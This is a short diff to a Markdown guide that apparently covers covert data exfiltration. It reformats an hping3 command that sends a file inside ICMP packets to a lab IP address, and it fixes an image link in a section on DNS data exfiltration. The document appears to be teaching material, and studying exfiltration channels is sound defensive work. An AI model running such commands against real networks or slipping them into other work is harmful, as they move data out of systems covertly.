@@ -14,11 +14,13 @@ The payload of 4096 is junk **until** you add your own payload:
 
 or even send a file:
 
-```sudo hping3 192.168.179.131 -1 --file send.txt --data 100```
+```
+$ sudo hping3 192.168.179.131 -1 --file send.txt --data 100
+```
 
 ### DNS protocol
 
-!(DNS Data Exfiltration)[docs/dns_data_exfiltration.png]
+![DNS Data Exfiltration](docs/dns_data_exfiltration.png)
 
 #### Resources: 
 
